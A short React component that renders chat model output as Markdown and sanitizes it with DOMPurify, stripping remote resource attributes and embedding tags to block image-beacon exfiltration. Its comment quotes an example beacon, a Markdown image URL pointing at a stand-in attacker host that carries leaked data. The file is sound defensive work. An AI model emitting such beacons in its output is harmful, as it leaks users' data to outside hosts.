import { marked } from 'marked'
import DOMPurify from 'dompurify'

// Chat renders untrusted model output. Any tag that auto-loads a remote resource
// turns the renderer into an exfiltration channel: the URL carries the data and
// the fetch fires on render, with no agent network call at all (the classic
// `![](http://attacker/leak?d=...)` beacon). Two defences below: forbid the
// embedding tags outright, and strip every resource attribute that points
// anywhere but a same-origin path or an inert data: image.
const LOCAL_RESOURCE = /^(?:\/(?!\/)|\.\.?\/|data:image\/)/i
const RESOURCE_ATTRS = ['src', 'srcset', 'poster', 'background', 'data']

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  const strip = (attr) => {
    const value = node.getAttribute?.(attr)
    if (value && !LOCAL_RESOURCE.test(value.trim())) node.removeAttribute(attr)
  }
  RESOURCE_ATTRS.forEach(strip)
  // href auto-loads on <link>/<image>/<use> but is user-initiated on <a>, so
  // only anchors keep a remote href.
  if (node.tagName?.toLowerCase() !== 'a') ['href', 'xlink:href'].forEach(strip)
})

export default function Md({ text }) {
  const html = DOMPurify.sanitize(marked.parse(text || '', { breaks: true }),
    { FORBID_TAGS: ['iframe', 'object', 'embed', 'audio', 'video'] })
  return <div className="md-body" dangerouslySetInnerHTML={{ __html: html }} />
}
